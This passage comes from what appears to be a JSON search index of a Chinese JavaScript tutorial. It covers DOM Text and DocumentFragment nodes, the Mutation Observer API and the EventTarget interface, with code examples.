document.getElementById(&#039;myDiv&#039;).dataset.foo;</code></pre><p>除了<code>dataset</code>属性，也可以用<code>getAttribute(&#39;data-foo&#39;)</code>、<code>removeAttribute(&#39;data-foo&#39;)</code>、<code>setAttribute(&#39;data-foo&#39;)</code>、<code>hasAttribute(&#39;data-foo&#39;)</code>等方法操作<code>data-*</code>属性。</p>\n<p>注意，<code>data-</code>后面的属性名有限制，只能包含字母、数字、连词线（<code>-</code>）、点（<code>.</code>）、冒号（<code>:</code>）和下划线（<code>_</code>)。而且，属性名不应该使用<code>A</code>到<code>Z</code>的大写字母，比如不能有<code>data-helloWorld</code>这样的属性名，而要写成<code>data-hello-world</code>。</p>\n<p>转成<code>dataset</code>的键名时，连词线后面如果跟着一个小写字母，那么连词线会被移除，该小写字母转为大写字母，其他字符不变。反过来，<code>dataset</code>的键名转成属性名时，所有大写字母都会被转成连词线+该字母的小写形式，其他字符不变。比如，<code>dataset.helloWorld</code>会转成<code>data-hello-world</code>。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"DOM","link":"javascript:void(0)"},{"title":"Text 节点和 DocumentFragment 节点","link":"/dom/text.html"}],"content":"\n        <h1>\n            <a href='#Text-节点和-DocumentFragment-节点' class='header-anchor'>#</a>\n            <span>Text 节点和 DocumentFragment 节点</span>\n        </h1>\n    \n        <h2>\n            <a href='#Text-节点的概念' class='header-anchor'>#</a>\n            <span>Text 节点的概念</span>\n        </h2>\n    <p>文本节点（<code>Text</code>）代表元素节点（<code>Element</code>）和属性节点（<code>Attribute</code>）的文本内容。如果一个节点只包含一段文本，那么它就有一个文本子节点，代表该节点的文本内容。</p>\n<p>通常我们使用父节点的<code>firstChild</code>、<code>nextSibling</code>等属性获取文本节点，或者使用<code>Document</code>节点的<code>createTextNode</code>方法创造一个文本节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 获取文本节点\nvar textNode = document.querySelector(&#039;p&#039;).firstChild;\n\n// 创造文本节点\nvar textNode = document.createTextNode(&#039;Hi&#039;);\ndocument.querySelector(&#039;div&#039;).appendChild(textNode);</code></pre><p>浏览器原生提供一个<code>Text</code>构造函数。它返回一个文本节点实例。它的参数就是该文本节点的文本内容。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 空字符串\nvar text1 = new Text();\n\n// 非空字符串\nvar text2 = new Text(&#039;This is a text node&#039;);</code></pre><p>注意，由于空格也是一个字符，所以哪怕只有一个空格，也会形成文本节点。比如，<code>&lt;p&gt; &lt;/p&gt;</code>包含一个空格，它的子节点就是一个文本节点。</p>\n<p>文本节点除了继承<code>Node</code>接口，还继承了<code>CharacterData</code>接口。<code>Node</code>接口的属性和方法请参考《Node 接口》一章，这里不再重复介绍了，以下的属性和方法大部分来自<code>CharacterData</code>接口。</p>\n\n        <h2>\n            <a href='#Text-节点的属性' class='header-anchor'>#</a>\n            <span>Text 节点的属性</span>\n        </h2>\n    \n        <h3>\n            <a href='#data' class='header-anchor'>#</a>\n            <span>data</span>\n        </h3>\n    <p><code>data</code>属性等同于<code>nodeValue</code>属性，用来设置或读取文本节点的内容。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 读取文本内容\ndocument.querySelector(&#039;p&#039;).firstChild.data\n// 等同于\ndocument.querySelector(&#039;p&#039;).firstChild.nodeValue\n\n// 设置文本内容\ndocument.querySelector(&#039;p&#039;).firstChild.data = &#039;Hello World&#039;;</code></pre>\n        <h3>\n            <a href='#wholeText' class='header-anchor'>#</a>\n            <span>wholeText</span>\n        </h3>\n    <p><code>wholeText</code>属性将当前文本节点与毗邻的文本节点，作为一个整体返回。大多数情况下，<code>wholeText</code>属性的返回值，与<code>data</code>属性和<code>textContent</code>属性相同。但是，某些特殊情况会有差异。</p>\n<p>举例来说，HTML 代码如下。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;p id=&quot;para&quot;&gt;A &lt;em&gt;B&lt;/em&gt; C&lt;/p&gt;</code></pre><p>这时，文本节点的<code>wholeText</code>属性和<code>data</code>属性，返回值相同。</p>\n<pre class=\"prettyprint language-javascript\"><code>var el = document.getElementById(&#039;para&#039;);\nel.firstChild.wholeText // &quot;A &quot;\nel.firstChild.data // &quot;A &quot;</code></pre><p>但是，一旦移除<code>&lt;em&gt;</code>节点，<code>wholeText</code>属性与<code>data</code>属性就会有差异，因为这时其实<code>&lt;p&gt;</code>节点下面包含了两个毗邻的文本节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>el.removeChild(para.childNodes[1]);\nel.firstChild.wholeText // &quot;A C&quot;\nel.firstChild.data // &quot;A &quot;</code></pre>\n        <h3>\n            <a href='#length' class='header-anchor'>#</a>\n            <span>length</span>\n        </h3>\n    <p><code>length</code>属性返回当前文本节点的文本长度。</p>\n<pre class=\"prettyprint language-javascript\"><code>(new Text(&#039;Hello&#039;)).length // 5</code></pre>\n        <h3>\n            <a href='#nextElementSibling，previousElementSibling' class='header-anchor'>#</a>\n            <span>nextElementSibling，previousElementSibling</span>\n        </h3>\n    <p><code>nextElementSibling</code>属性返回紧跟在当前文本节点后面的那个同级元素节点。如果取不到元素节点，则返回<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 为\n// &lt;div&gt;Hello &lt;em&gt;World&lt;/em&gt;&lt;/div&gt;\nvar tn = document.querySelector(&#039;div&#039;).firstChild;\ntn.nextElementSibling\n// &lt;em&gt;World&lt;/em&gt;</code></pre><p><code>previousElementSibling</code>属性返回当前文本节点前面最近的同级元素节点。如果取不到元素节点，则返回<code>null：</code>。</p>\n\n        <h2>\n            <a href='#Text-节点的方法' class='header-anchor'>#</a>\n            <span>Text 节点的方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#appendData()，deleteData()，insertData()，replaceData()，subStringData()' class='header-anchor'>#</a>\n            <span>appendData()，deleteData()，insertData()，replaceData()，subStringData()</span>\n        </h3>\n    <p>以下5个方法都是编辑<code>Text</code>节点文本内容的方法。</p>\n<ul>\n<li><code>appendData()</code>：在<code>Text</code>节点尾部追加字符串。</li>\n<li><code>deleteData()</code>：删除<code>Text</code>节点内部的子字符串，第一个参数为子字符串开始位置，第二个参数为子字符串长度。</li>\n<li><code>insertData()</code>：在<code>Text</code>节点插入字符串，第一个参数为插入位置，第二个参数为插入的子字符串。</li>\n<li><code>replaceData()</code>：用于替换文本，第一个参数为替换开始位置，第二个参数为需要被替换掉的长度，第三个参数为新加入的字符串。</li>\n<li><code>subStringData()</code>：用于获取子字符串，第一个参数为子字符串在<code>Text</code>节点中的开始位置，第二个参数为子字符串长度。</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码为\n// &lt;p&gt;Hello World&lt;/p&gt;\nvar pElementText = document.querySelector(&#039;p&#039;).firstChild;\n\npElementText.appendData(&#039;!&#039;);\n// 页面显示 Hello World!\npElementText.deleteData(7, 5);\n// 页面显示 Hello W\npElementText.insertData(7, &#039;Hello &#039;);\n// 页面显示 Hello WHello\npElementText.replaceData(7, 5, &#039;World&#039;);\n// 页面显示 Hello WWorld\npElementText.substringData(7, 10); \n// 页面显示不变，返回&quot;World &quot;</code></pre>\n        <h3>\n            <a href='#remove()' class='header-anchor'>#</a>\n            <span>remove()</span>\n        </h3>\n    <p><code>remove</code>方法用于移除当前<code>Text</code>节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码为\n// &lt;p&gt;Hello World&lt;/p&gt;\ndocument.querySelector(&#039;p&#039;).firstChild.remove()\n// 现在 HTML 代码为\n// &lt;p&gt;&lt;/p&gt;</code></pre>\n        <h3>\n            <a href='#splitText()' class='header-anchor'>#</a>\n            <span>splitText()</span>\n        </h3>\n    <p><code>splitText</code>方法将<code>Text</code>节点一分为二，变成两个毗邻的<code>Text</code>节点。它的参数就是分割位置（从零开始），分割到该位置的字符前结束。如果分割位置不存在，将报错。</p>\n<p>分割后，该方法返回分割位置后方的字符串，而原<code>Text</code>节点变成只包含分割位置前方的字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>// html 代码为 &lt;p id=&quot;p&quot;&gt;foobar&lt;/p&gt;\nvar p = document.getElementById(&#039;p&#039;);\nvar textnode = p.firstChild;\n\nvar newText = textnode.splitText(3);\nnewText // &quot;bar&quot;\ntextnode // &quot;foo&quot;</code></pre><p>父元素节点的<code>normalize</code>方法可以将毗邻的两个<code>Text</code>节点合并。</p>\n<p>接上面的例子，文本节点的<code>splitText</code>方法将一个<code>Text</code>节点分割成两个，父元素的<code>normalize</code>方法可以实现逆操作，将它们合并。</p>\n<pre class=\"prettyprint language-javascript\"><code>p.childNodes.length // 2\n\n// 将毗邻的两个 Text 节点合并\np.normalize();\np.childNodes.length // 1</code></pre>\n        <h2>\n            <a href='#DocumentFragment-节点' class='header-anchor'>#</a>\n            <span>DocumentFragment 节点</span>\n        </h2>\n    <p><code>DocumentFragment</code>节点代表一个文档的片段，本身就是一个完整的 DOM 树形结构。它没有父节点，<code>parentNode</code>返回<code>null</code>，但是可以插入任意数量的子节点。它不属于当前文档，操作<code>DocumentFragment</code>节点，要比直接操作 DOM 树快得多。</p>\n<p>它一般用于构建一个 DOM 结构，然后插入当前文档。<code>document.createDocumentFragment</code>方法，以及浏览器原生的<code>DocumentFragment</code>构造函数，可以创建一个空的<code>DocumentFragment</code>节点。然后再使用其他 DOM 方法，向其添加子节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>var docFrag = document.createDocumentFragment();\n// 等同于\nvar docFrag = new DocumentFragment();\n\nvar li = document.createElement(&#039;li&#039;);\nli.textContent = &#039;Hello World&#039;;\ndocFrag.appendChild(li);\n\ndocument.querySelector(&#039;ul&#039;).appendChild(docFrag);</code></pre><p>上面代码创建了一个<code>DocumentFragment</code>节点，然后将一个<code>li</code>节点添加在它里面，最后将<code>DocumentFragment</code>节点移动到原文档。</p>\n<p>注意，<code>DocumentFragment</code>节点本身不能被插入当前文档。当它作为<code>appendChild()</code>、<code>insertBefore()</code>、<code>replaceChild()</code>等方法的参数时，是它的所有子节点插入当前文档，而不是它自身。一旦<code>DocumentFragment</code>节点被添加进当前文档，它自身就变成了空节点（<code>textContent</code>属性为空字符串），可以被再次使用。如果想要保存<code>DocumentFragment</code>节点的内容，可以使用<code>cloneNode</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>document\n  .queryselector(&#039;ul&#039;)\n  .appendChild(docFrag.cloneNode(true));</code></pre><p>上面这样添加<code>DocumentFragment</code>节点进入当前文档，不会清空<code>DocumentFragment</code>节点。</p>\n<p>下面是一个例子，使用<code>DocumentFragment</code>反转一个指定节点的所有子节点的顺序。</p>\n<pre class=\"prettyprint language-javascript\"><code>function reverse(n) {\n  var f = document.createDocumentFragment();\n  while(n.lastChild) f.appendChild(n.lastChild);\n  n.appendChild(f);\n}</code></pre><p><code>DocumentFragment</code>节点对象没有自己的属性和方法，全部继承自<code>Node</code>节点和<code>ParentNode</code>接口。也就是说，<code>DocumentFragment</code>节点比<code>Node</code>节点多出以下四个属性。</p>\n<ul>\n<li><code>children</code>：返回一个动态的<code>HTMLCollection</code>集合对象，包括当前<code>DocumentFragment</code>对象的所有子元素节点。</li>\n<li><code>firstElementChild</code>：返回当前<code>DocumentFragment</code>对象的第一个子元素节点，如果没有则返回<code>null</code>。</li>\n<li><code>lastElementChild</code>：返回当前<code>DocumentFragment</code>对象的最后一个子元素节点，如果没有则返回<code>null</code>。</li>\n<li><code>childElementCount</code>：返回当前<code>DocumentFragment</code>对象的所有子元素数量。</li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"DOM","link":"javascript:void(0)"},{"title":"Mutation Observer API","link":"/dom/mutationobserver.html"}],"content":"\n        <h1>\n            <a href='#Mutation-Observer-API' class='header-anchor'>#</a>\n            <span>Mutation Observer API</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>Mutation Observer API 用来监视 DOM 变动。DOM 的任何变动，比如节点的增减、属性的变动、文本内容的变动，这个 API 都可以得到通知。</p>\n<p>概念上，它很接近事件，可以理解为 DOM 发生变动就会触发 Mutation Observer 事件。但是，它与事件有一个本质不同：事件是同步触发，也就是说，DOM 的变动立刻会触发相应的事件；Mutation Observer 则是异步触发，DOM 的变动并不会马上触发，而是要等到当前所有 DOM 操作都结束才触发。</p>\n<p>这样设计是为了应付 DOM 变动频繁的特点。举例来说，如果文档中连续插入1000个<code>&lt;p&gt;</code>元素，就会连续触发1000个插入事件，执行每个事件的回调函数，这很可能造成浏览器的卡顿；而 Mutation Observer 完全不同，只在1000个段落都插入结束后才会触发，而且只触发一次。</p>\n<p>Mutation Observer 有以下特点。</p>\n<ul>\n<li>它等待所有脚本任务完成后，才会运行（即异步触发方式）。</li>\n<li>它把 DOM 变动记录封装成一个数组进行处理，而不是一条条个别处理 DOM 变动。</li>\n<li>它既可以观察 DOM 的所有类型变动，也可以指定只观察某一类变动。</li>\n</ul>\n\n        <h2>\n            <a href='#MutationObserver-构造函数' class='header-anchor'>#</a>\n            <span>MutationObserver 构造函数</span>\n        </h2>\n    <p>使用时，首先使用<code>MutationObserver</code>构造函数，新建一个观察器实例，同时指定这个实例的回调函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>var observer = new MutationObserver(callback);</code></pre><p>上面代码中的回调函数，会在每次 DOM 变动后调用。该回调函数接受两个参数，第一个是变动数组，第二个是观察器实例，下面是一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var observer = new MutationObserver(function (mutations, observer) {\n  mutations.forEach(function(mutation) {\n    console.log(mutation);\n  });\n});</code></pre>\n        <h2>\n            <a href='#MutationObserver-的实例方法' class='header-anchor'>#</a>\n            <span>MutationObserver 的实例方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#observe()' class='header-anchor'>#</a>\n            <span>observe()</span>\n        </h3>\n    <p><code>observe</code>方法用来启动监听，它接受两个参数。</p>\n<ul>\n<li>第一个参数：所要观察的 DOM 节点</li>\n<li>第二个参数：一个配置对象，指定所要观察的特定变动</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>var article = document.querySelector(&#039;article&#039;);\n\nvar  options = {\n  &#039;childList&#039;: true,\n  &#039;attributes&#039;:true\n} ;\n\nobserver.observe(article, options);</code></pre><p>上面代码中，<code>observe</code>方法接受两个参数，第一个是所要观察的DOM元素是<code>article</code>，第二个是所要观察的变动类型（子节点变动和属性变动）。</p>\n<p>观察器所能观察的 DOM 变动类型（即上面代码的<code>options</code>对象），有以下几种。</p>\n<ul>\n<li><strong>childList</strong>：子节点的变动（指新增，删除或者更改）。</li>\n<li><strong>attributes</strong>：属性的变动。</li>\n<li><strong>characterData</strong>：节点内容或节点文本的变动。</li>\n</ul>\n<p>想要观察哪一种变动类型，就在<code>option</code>对象中指定它的值为<code>true</code>。需要注意的是，必须同时指定<code>childList</code>、<code>attributes</code>和<code>characterData</code>中的一种或多种，若未均指定将报错。</p>\n<p>除了变动类型，<code>options</code>对象还可以设定以下属性：</p>\n<ul>\n<li><code>subtree</code>：布尔值，表示是否将该观察器应用于该节点的所有后代节点。</li>\n<li><code>attributeOldValue</code>：布尔值，表示观察<code>attributes</code>变动时，是否需要记录变动前的属性值。</li>\n<li><code>characterDataOldValue</code>：布尔值，表示观察<code>characterData</code>变动时，是否需要记录变动前的值。</li>\n<li><code>attributeFilter</code>：数组，表示需要观察的特定属性（比如<code>[&#39;class&#39;,&#39;src&#39;]</code>）。</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>// 开始监听文档根节点（即&lt;html&gt;标签）的变动\nmutationObserver.observe(document.documentElement, {\n  attributes: true,\n  characterData: true,\n  childList: true,\n  subtree: true,\n  attributeOldValue: true,\n  characterDataOldValue: true\n});</code></pre><p>对一个节点添加观察器，就像使用<code>addEventListener</code>方法一样，多次添加同一个观察器是无效的，回调函数依然只会触发一次。但是，如果指定不同的<code>options</code>对象，就会被当作两个不同的观察器。</p>\n<p>下面的例子是观察新增的子节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>var insertedNodes = [];\nvar observer = new MutationObserver(function(mutations) {\n  mutations.forEach(function(mutation) {\n    for (var i = 0; i &lt; mutation.addedNodes.length; i++)\n      insertedNodes.push(mutation.addedNodes[i]);\n  })\n});\nobserver.observe(document, { childList: true });\nconsole.log(insertedNodes);</code></pre>\n        <h3>\n            <a href='#disconnect()，takeRecords（）' class='header-anchor'>#</a>\n            <span>disconnect()，takeRecords（）</span>\n        </h3>\n    <p><code>disconnect</code>方法用来停止观察。调用该方法后，DOM 再发生变动，也不会触发观察器。</p>\n<pre class=\"prettyprint language-javascript\"><code>observer.disconnect();</code></pre><p><code>takeRecords</code>方法用来清除变动记录，即不再处理未处理的变动。该方法返回变动记录的数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>observer.takeRecords();</code></pre><p>下面是一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 保存所有没有被观察器处理的变动\nvar changes = mutationObserver.takeRecords();\n\n// 停止观察\nmutationObserver.disconnect();</code></pre>\n        <h2>\n            <a href='#MutationRecord-对象' class='header-anchor'>#</a>\n            <span>MutationRecord 对象</span>\n        </h2>\n    <p>DOM 每次发生变化，就会生成一条变动记录（MutationRecord 实例）。该实例包含了与变动相关的所有信息。Mutation Observer 处理的就是一个个<code>MutationRecord</code>实例所组成的数组。</p>\n<p><code>MutationRecord</code>对象包含了DOM的相关信息，有如下属性：</p>\n<ul>\n<li><code>type</code>：观察的变动类型（<code>attribute</code>、<code>characterData</code>或者<code>childList</code>）。</li>\n<li><code>target</code>：发生变动的DOM节点。</li>\n<li><code>addedNodes</code>：新增的DOM节点。</li>\n<li><code>removedNodes</code>：删除的DOM节点。</li>\n<li><code>previousSibling</code>：前一个同级节点，如果没有则返回<code>null</code>。</li>\n<li><code>nextSibling</code>：下一个同级节点，如果没有则返回<code>null</code>。</li>\n<li><code>attributeName</code>：发生变动的属性。如果设置了<code>attributeFilter</code>，则只返回预先指定的属性。</li>\n<li><code>oldValue</code>：变动前的值。这个属性只对<code>attribute</code>和<code>characterData</code>变动有效，如果发生<code>childList</code>变动，则返回<code>null</code>。</li>\n</ul>\n\n        <h2>\n            <a href='#应用示例' class='header-anchor'>#</a>\n            <span>应用示例</span>\n        </h2>\n    \n        <h3>\n            <a href='#子元素的变动' class='header-anchor'>#</a>\n            <span>子元素的变动</span>\n        </h3>\n    <p>下面的例子说明如何读取变动记录。</p>\n<pre class=\"prettyprint language-javascript\"><code>var callback = function (records){\n  records.map(function(record){\n    console.log(&#039;Mutation type: &#039; + record.type);\n    console.log(&#039;Mutation target: &#039; + record.target);\n  });\n};\n\nvar mo = new MutationObserver(callback);\n\nvar option = {\n  &#039;childList&#039;: true,\n  &#039;subtree&#039;: true\n};\n\nmo.observe(document.body, option);</code></pre><p>上面代码的观察器，观察<code>&lt;body&gt;</code>的所有下级节点（<code>childList</code>表示观察子节点，<code>subtree</code>表示观察后代节点）的变动。回调函数会在控制台显示所有变动的类型和目标节点。</p>\n\n        <h3>\n            <a href='#属性的变动' class='header-anchor'>#</a>\n            <span>属性的变动</span>\n        </h3>\n    <p>下面的例子说明如何追踪属性的变动。</p>\n<pre class=\"prettyprint language-javascript\"><code>var callback = function (records) {\n  records.map(function (record) {\n    console.log(&#039;Previous attribute value: &#039; + record.oldValue);\n  });\n};\n\nvar mo = new MutationObserver(callback);\n\nvar element = document.getElementById(&#039;#my_element&#039;);\n\nvar options = {\n  &#039;attributes&#039;: true,\n  &#039;attributeOldValue&#039;: true\n}\n\nmo.observe(element, options);</code></pre><p>上面代码先设定追踪属性变动（<code>&#39;attributes&#39;: true</code>），然后设定记录变动前的值。实际发生变动时，会将变动前的值显示在控制台。</p>\n\n        <h3>\n            <a href='#取代-DOMContentLoaded-事件' class='header-anchor'>#</a>\n            <span>取代 DOMContentLoaded 事件</span>\n        </h3>\n    <p>网页加载的时候，DOM 节点的生成会产生变动记录，因此只要观察 DOM 的变动，就能在第一时间触发相关事件，因此也就没有必要使用<code>DOMContentLoaded</code>事件。</p>\n<pre class=\"prettyprint language-javascript\"><code>var observer = new MutationObserver(callback);\nobserver.observe(document.documentElement, {\n  childList: true,\n  subtree: true\n});</code></pre><p>上面代码中，监听<code>document.documentElement</code>（即HTML节点）的子节点的变动，<code>subtree</code>属性指定监听还包括后代节点。因此，任意一个网页元素一旦生成，就能立刻被监听到。</p>\n<p>下面的代码，使用<code>MutationObserver</code>对象封装一个监听 DOM 生成的函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>(function(win){\n  &#039;use strict&#039;;\n\n  var listeners = [];\n  var doc = win.document;\n  var MutationObserver = win.MutationObserver || win.WebKitMutationObserver;\n  var observer;\n\n  function ready(selector, fn){\n    // 储存选择器和回调函数\n    listeners.push({\n      selector: selector,\n      fn: fn\n    });\n    if(!observer){\n      // 监听document变化\n      observer = new MutationObserver(check);\n      observer.observe(doc.documentElement, {\n        childList: true,\n        subtree: true\n      });\n    }\n    // 检查该节点是否已经在DOM中\n    check();\n  }\n\n  function check(){\n  // 检查是否匹配已储存的节点\n    for(var i = 0; i &lt; listeners.length; i++){\n      var listener = listeners[i];\n      // 检查指定节点是否有匹配\n      var elements = doc.querySelectorAll(listener.selector);\n      for(var j = 0; j &lt; elements.length; j++){\n        var element = elements[j];\n        // 确保回调函数只会对该元素调用一次\n        if(!element.ready){\n          element.ready = true;\n          // 对该节点调用回调函数\n          listener.fn.call(element, element);\n        }\n      }\n    }\n  }\n\n  // 对外暴露ready\n  win.ready = ready;\n\n})(this);\n\nready(&#039;.foo&#039;, function(element){\n  // ...\n});</code></pre>\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Paul Kinlan, <a href=\"https://developers.google.com/web/updates/2012/02/Detect-DOM-changes-with-Mutation-Observers\">Detect DOM changes with Mutation Observers</a></li>\n<li>Tiffany Brown, <a href=\"http://dev.opera.com/articles/view/mutation-observers-tutorial/\">Getting to know mutation observers</a></li>\n<li>Michal Budzynski, <a href=\"http://michalbe.blogspot.com/2013/04/javascript-less-known-parts-dom.html\">JavaScript: The less known parts. DOM Mutations</a></li>\n<li>Jeff Griffiths, <a href=\"https://hacks.mozilla.org/2012/05/dom-mutationobserver-reacting-to-dom-changes-without-killing-browser-performance/\">DOM MutationObserver – reacting to DOM changes without killing browser performance</a></li>\n<li>Addy Osmani, <a href=\"http://addyosmani.com/blog/mutation-observers/\">Detect, Undo And Redo DOM Changes With Mutation Observers</a></li>\n<li>Ryan Morr, <a href=\"http://ryanmorr.com/using-mutation-observers-to-watch-for-element-availability/\">Using Mutation Observers to Watch for Element Availability</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"事件","link":"javascript:void(0)"},{"title":"EventTarget 接口","link":"/events/eventtarget.html"}],"content":"\n        <h1>\n            <a href='#EventTarget-接口' class='header-anchor'>#</a>\n            <span>EventTarget 接口</span>\n        </h1>\n    <p>事件的本质是程序各个组成部分之间的一种通信方式，也是异步编程的一种实现。DOM 支持大量的事件，本章开始介绍 DOM 的事件编程。</p>\n\n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>DOM 的事件操作（监听和触发），都定义在<code>EventTarget</code>接口。所有节点对象都部署了这个接口，其他一些需要事件通信的浏览器内置对象（比如，<code>XMLHttpRequest</code>、<code>AudioNode</code>、<code>AudioContext</code>）也部署了这个接口。</p>\n<p>该接口主要提供三个实例方法。</p>\n<ul>\n<li><code>addEventListener</code>：绑定事件的监听函数</li>\n<li><code>removeEventListener</code>：移除事件的监听函数</li>\n<li><code>dispatchEvent</code>：触发事件</li>\n</ul>\n\n        <h2>\n            <a href='#EventTarget.addEventListener()' class='header-anchor'>#</a>\n            <span>EventTarget.addEventListener()</span>\n        </h2>\n    <p><code>EventTarget.addEventListener()</code>用于在当前节点或对象上，定义一个特定事件的监听函数。一旦这个事件发生，就会执行监听函数。该方法没有返回值。</p>\n<pre class=\"prettyprint language-javascript\"><code>target.addEventListener(type, listener[, useCapture]);</code></pre><p>该方法接受三个参数。</p>\n<ul>\n<li><code>type</code>：事件名称，大小写敏感。</li>\n<li><code>listener</code>：监听函数。事件发生时，会调用该监听函数。</li>\n<li><code>useCapture</code>：布尔值，表示监听函数是否在捕获阶段（capture）触发（参见后文《事件的传播》部分），默认为<code>false</code>（监听函数只在冒泡阶段被触发）。该参数可选。</li>\n</ul>\n<p>下面是一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>function hello() {\n  console.log(&#039;Hello world&#039;);\n}\n\nvar button = document.getElementById(&#039;btn&#039;);\nbutton.addEventListener(&#039;click&#039;, hello, false);</code></pre><p>上面代码中，<code>button</code>节点的<code>addEventListener</code>方法绑定<code>click</code>事件的监听函数<code>hello</code>，该函数只在冒泡阶段触发。</p>\n<p>关于参数，有两个地方需要注意。</p>\n<p>首先，第二个参数除了监听函数，还可以是一个具有<code>handleEvent</code>方法的对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>buttonElement.addEventListener(&#039;click&#039;, {\n  handleEvent: function (event) {\n    console.log(&#039;click&#039;);\n  }\n});</code></pre><p>上面代码中，<code>addEventListener</code>方法的第二个参数，就是一个具有<code>handleEvent</code>方法的对象。</p>\n<p>其次，第三个参数除了布尔值<code>useCapture</code>，还可以是一个属性配置对象。该对象有以下属性。</p>\n<blockquote>\n<ul>\n<li><code>capture</code>：布尔值，表示该事件是否在<code>捕获阶段</code>触发监听函数。</li>\n<li><code>once</code>：布尔值，表示监听函数是否只触发一次，然后就自动移除。</li>\n<li><code>passive</code>：布尔值，表示监听函数不会调用事件的<code>preventDefault</code>方法。如果监听函数调用了，浏览器将忽略这个要求，并在监控台输出一行警告。</li>\n</ul>\n</blockquote>\n<p>如果希望事件监听函数只执行一次，可以打开属性配置对象的<code>once</code>属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>element.addEventListener(&#039;click&#039;, function (event) {\n  // 只执行一次的代码\n}, {once: true});</code></pre><p><code>addEventListener</code>方法可以为针对当前对象的同一个事件，添加多个不同的监听函数。这些函数按照添加顺序触发，即先添加先触发。如果为同一个事件多次添加同一个监听函数，该函数只会执行一次，多余的添加将自动被去除（不必使用<code>removeEventListener</code>方法手动去除）。</p>\n<pre class=\"prettyprint language-javascript\"><code>function hello() {\n  console.log(&#039;Hello world&#039;);\n}\n\ndocument.addEventListener(&#039;click&#039;, hello, false);\ndocument.addEventListener(&#039;click&#039;, hello, false);</code></pre><p>执行上面代码，点击文档只会输出一行<code>Hello world</code>。</p>\n<p>如果希望向监听函数传递参数，可以用匿名函数包装一下监听函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function print(x) {\n  console.log(x);\n}\n\nvar el = document.getElementById(&#039;div1&#039;);\nel.addEventListener(&#039;click&#039;, function () { print(&#039;Hello&#039;); }, false);</code></pre><p>上面代码通过匿名函数，向监听函数<code>print</code>传递了一个参数。</p>\n<p>监听函数内部的<code>this</code>，指向当前事件所在的那个对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;p id=&quot;para&quot;&gt;Hello&lt;/p&gt;\nvar para = document.getElementById(&#039;para&#039;);\npara.addEventListener(&#039;click&#039;, function (e) {\n  console.log(this.nodeName); // &quot;P&quot;\n}, false);</code></pre><p>上面代码中，监听函数内部的<code>this</code>指向事件所在的对象<code>para</code>。</p>\n\n        <h2>\n            <a href='#EventTarget.removeEventListener()' class='header-anchor'>#</a>\n            <span>EventTarget.removeEventListener()</span>\n        </h2>\n    <p><code>EventTarget.removeEventListener</code>方法用来移除<code>addEventListener</code>方法添加的事件监听函数。该方法没有返回值。</p>\n<pre class=\"prettyprint language-javascript\"><code>div.addEventListener(&#039;click&#039;, listener, false);\ndiv.removeEventListener(&#039;click&#039;, listener, false);</code></pre><p><code>removeEventListener</code>方法的参数，与<code>addEventListener</code>方法完全一致。它的第一个参数“事件类型”，大小写敏感。</p>\n<p>注意，<code>removeEventListener</code>方法移除的监听函数，必须是<code>addEventListener</code>方法添加的那个监听函数，而且必须在同一个元素节点，否则无效。</p>\n<pre class=\"prettyprint language-javascript\"><code>div.addEventListener(&#039;click&#039;, function (e) {}, false);\ndiv.removeEventListener(&#039;click&#039;, function (e) {}, false);</code></pre><p>上面代码中，<code>removeEventListener</code>方法无效，因为监听函数不是同一个匿名函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>element.addEventListener(&#039;mousedown&#039;, handleMouseDown, true);\nelement.removeEventListener(&quot;mousedown&quot;, handleMouseDown, false);</code></pre><p>上面代码中，<code>removeEventListener</code>方法也是无效的，因为第三个参数不一样。</p>\n\n        <h2>\n            <a href='#EventTarget.dispatchEvent()' class='header-anchor'>#</a>\n            <span>EventTarget.dispatchEvent()</span>\n        </h2>\n    <p><code>EventTarget.dispatchEvent</code>方法在当前节点上触发指定事件，从而触发监听函数的执行。该方法返回一个布尔值，只要有一个监听函数调用了<code>Event.preventDefault()</code>，则返回值为<code>false</code>，否则为<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>target.dispatchEvent(event)</code></pre><p><code>dispatchEvent</code>方法的参数是一个<code>Event</code>对象的实例（详见《Event 对象》章节）。</p>\n<pre class=\"prettyprint language-javascript\"><code>para.addEventListener(&#039;click&#039;, hello, false);\nvar event = new Event(&#039;click&#039;);\npara.dispatchEvent(event);</code></pre><p>上面代码在当前节点触发了<code>click</code>事件。</p>\n<p>如果<code>dispatchEvent</code>方法的参数为空，或者不是一个有效的事件对象，将报错。</p>\n<p>下面代码根据<code>dispatchEvent</code>方法的返回值，判断事件是否被取消了。</p>\n<pre class=\"prettyprint 